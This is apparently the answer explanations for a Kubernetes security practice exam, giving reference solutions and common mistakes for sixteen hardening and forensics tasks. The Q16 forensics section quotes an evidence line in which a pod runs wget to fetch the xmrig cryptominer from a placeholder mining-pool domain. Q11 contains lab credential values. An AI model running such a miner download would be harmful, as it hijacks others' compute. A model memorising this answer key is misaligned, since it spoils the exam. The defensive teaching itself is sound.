# Explanations

Shown after submission, only for tasks that did not earn full points.
There is no single correct answer — grading checks the outcome, so what follows is the
shortest reference solution.

## Q1 NetworkPolicy — default deny, selective allow

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all, namespace: prod }
spec:
  podSelector: {}
  policyTypes: ["Ingress"]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: allow-frontend, namespace: prod }
spec:
  podSelector: { matchLabels: { app: backend } }
  policyTypes: ["Ingress"]
  ingress:
    - from:
        - podSelector: { matchLabels: { app: frontend } }
      ports:
        - { protocol: TCP, port: 80 }
```

Common mistakes

- An empty `podSelector: {}` means **every pod** — omitting it entirely is a syntax error,
  not "no pods".
- NetworkPolicies are **additive** — traffic matched by any allow policy passes even with a
  deny-all in place.
- Under `from`, separate `- podSelector` / `- namespaceSelector` items are OR;
  both keys in one item are AND.

## Q2 TLS Secret and TLS Ingress

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout web.key -out web.crt -subj "/CN=web.snacklab.local"
kubectl create secret tls web-cert -n prod --cert=web.crt --key=web.key
```

In the Ingress put `secretName: web-cert` under `spec.tls`, and route host
`web.snacklab.local`, path `/` (Prefix) to `web-svc:80`.

Common mistakes

- `kubectl create secret generic` yields type `Opaque` and loses the point —
  it must be **`create secret tls`**.
- Rules without a `tls` section are not a TLS Ingress.

## Q3 Verify platform binaries

```bash
cd ~/work/binaries && sha512sum -c checksums.txt
# kubelet: FAILED
echo kubelet > ~/answers/q3.txt
```

Any binary whose checksum differs from the vendor-published value cannot be trusted.
The real exam asks exactly this with `sha512sum`/`sha256sum -c`.

## Q4 Tighten RBAC to least privilege

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata: { name: ci-role, namespace: apps }
rules:
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list"]
  - apiGroups: ["apps"]
    resources: ["deployments"]
    verbs: ["get", "list", "update"]
```

```bash
kubectl -n apps delete rolebinding ci-bot-rb
kubectl -n apps create rolebinding ci-bot-rb --role=ci-role --serviceaccount=apps:ci-bot
```

Common mistakes

- A RoleBinding's `roleRef` is **immutable** — switching from ClusterRole/admin to
  Role/ci-role means delete and recreate.
- `--resource=deployments` alone lands in the core group; it is `deployments.apps`.
- Grading uses `auth can-i` — if secrets are still readable or pods deletable, points are lost.

## Q5 Stop ServiceAccount token automount

```yaml
apiVersion: v1
kind: ServiceAccount
metadata: { name: web-sa, namespace: apps }
automountServiceAccountToken: false
```

```bash
kubectl -n apps patch deploy web -p '{"spec":{"template":{"spec":{"serviceAccountName":"web-sa"}}}}'
```

Common mistakes

- `automountServiceAccountToken` is a **top-level field** of the ServiceAccount
  (not metadata, not spec).
- Creating the SA without pointing the Deployment at it leaves the default SA token mounted.
- Setting `automountServiceAccountToken: false` in the pod spec works too — grading only
  checks the outcome.

## Q6 Remove a dangerous ClusterRoleBinding

```bash
kubectl get clusterrolebindings \
  -o custom-columns='NAME:.metadata.name,ROLE:.roleRef.name,SUBJECTS:.subjects[*].name' \
  | grep cluster-admin
echo debug-admin-binding > ~/answers/q6.txt
kubectl delete clusterrolebinding debug-admin-binding
```

Common mistakes

- The default `cluster-admin` binding (subject `system:masters`) is required — deleting it
  loses a point.
- Granting anything to `system:authenticated` means "anyone who can log in".

## Q7 Apply the RuntimeDefault seccomp profile

```bash
kubectl -n sys-hard patch deploy runner -p \
  '{"spec":{"template":{"spec":{"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}}}}}}'
```

Common mistakes

- `seccompProfile` lives **inside securityContext**; at pod level it covers every container.
- `type: Localhost` needs a `localhostProfile` path — here it is RuntimeDefault.

## Q8 Remove host access

`kubectl -n sys-hard edit deploy node-tool` and remove all four:
`securityContext.privileged`, `hostPID`, `hostNetwork`, the `hostPath` volume
(plus its `volumeMounts`).

Common mistakes

- Removing the hostPath volume but **leaving its volumeMounts** makes the spec invalid and
  stalls the rollout.
- Editing/patching beats deleting and recreating — faster and safer.

## Q9 Harden a container with SecurityContext

```yaml
containers:
  - name: app
    image: busybox:1.36
    command: ["sh", "-c", "sleep 86400"]
    securityContext:
      runAsNonRoot: true
      runAsUser: 10001
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
```

Common mistakes

- `allowPrivilegeEscalation`, `capabilities` and `readOnlyRootFilesystem` are
  **container-level only**.
- `runAsNonRoot: true` with a root-default image causes `CreateContainerConfigError` —
  give `runAsUser` too.

## Q10 Pod Security Admission — enforce restricted

```bash
kubectl label ns restricted-ns pod-security.kubernetes.io/enforce=restricted
```

Then make the Deployment satisfy restricted: drop `privileged`, pod-level
`runAsNonRoot: true`, `runAsUser`, `seccompProfile: {type: RuntimeDefault}`,
container-level `allowPrivilegeEscalation: false`, `capabilities.drop: ["ALL"]`.

Common mistakes

- **The label only affects new pods.** Old privileged pods keep running — the Deployment
  must roll out compliant pods.
- If the rollout is blocked, `kubectl -n restricted-ns describe rs` spells out **exactly
  which fields violate the profile**. Reading that is the fastest fix.

## Q11 Working with Secrets

```bash
kubectl -n apps get secret db-creds -o jsonpath='{.data.password}' | base64 -d > ~/answers/q11.txt
kubectl -n apps create secret generic api-token --from-literal=token=cks-2026
```

The pod uses `volumes[].secret.secretName: db-creds` plus a `volumeMounts` entry
(`mountPath: /etc/creds`, `readOnly: true`).

Common mistakes

- The `-o jsonpath` value is still **base64-encoded**; writing it undecoded is wrong.
- When echoing `S3cr3t-CKS!`, the `!` can trigger shell history expansion —
  single-quote it.

## Q12 Fix security defects in a Dockerfile

```dockerfile
FROM nginx:1.26
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*
COPY index.html /usr/share/nginx/html/index.html
USER nginx
CMD ["nginx", "-g", "daemon off;"]
```

Three fixes: pin the `latest` tag, delete the `ENV API_KEY=…` line (credentials persist in
image layers forever), and replace `USER root` with a non-root user. Keep COPY and CMD.

## Q13 Identify and quarantine vulnerable images

The reports show CRITICAL findings for `frontend-app` (nginx:1.25, 2) and `report-app`
(httpd:2.4, 1). `batch-app` (busybox) has only LOW — leave it alone.

```bash
printf 'frontend-app\nreport-app\n' > ~/answers/q13.txt
kubectl -n supply scale deploy frontend-app report-app --replicas=0
```

In the real exam you run `trivy image --severity CRITICAL <image>` to reach the same verdict.

## Q14 Pin an image by digest

```bash
kubectl -n supply get pod -l app=pinned \
  -o jsonpath='{.items[0].status.containerStatuses[0].imageID}'
# docker.io/library/nginx@sha256:abcd...
kubectl -n supply set image deploy/pinned web=nginx@sha256:abcd...
```

Common mistakes

- The digest must belong to a **real image** — a made-up one ends in ImagePullBackOff and
  fails the Ready check.

## Q15 API server audit logging

```yaml
# /var/lib/rancher/k3s/server/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: Metadata
    resources:
      - group: ""
        resources: ["secrets"]
  - level: None
```

```yaml
# /etc/rancher/k3s/config.yaml
kube-apiserver-arg:
  - audit-policy-file=/var/lib/rancher/k3s/server/audit-policy.yaml
  - audit-log-path=/var/lib/rancher/k3s/server/logs/audit.log
  - audit-log-maxage=7
  - audit-log-maxbackup=2
```

```bash
sudo mkdir -p /var/lib/rancher/k3s/server/logs
sudo systemctl restart k3s && kubectl get nodes   # always verify
```

Common mistakes

- **The first matching rule wins** — putting `level: None` first logs nothing.
- After the restart, if the apiserver stays down it is an argument typo —
  `sudo journalctl -u k3s | tail` shows it; fix config.yaml and restart again.

## Q16 Runtime forensics

```bash
for p in $(kubectl -n runtime get pod -o name); do
  echo "== $p"; kubectl -n runtime exec ${p#pod/} -- ps
done
# in the logshipper pod: wget ... http://pool.minexmr.example/xmrig ...
echo logshipper > ~/answers/q16.txt
kubectl -n runtime scale deploy logshipper --replicas=0
```

Common mistakes

- The workload name (`logshipper`) looks harmless — the **process list** is the evidence:
  a mining-pool domain and `xmrig`.
- Deleting the pod alone lets the Deployment recreate it. **replicas 0** is the quarantine.
- Taking down the innocent `web`/`metrics` loses points. Quarantine must be precise.
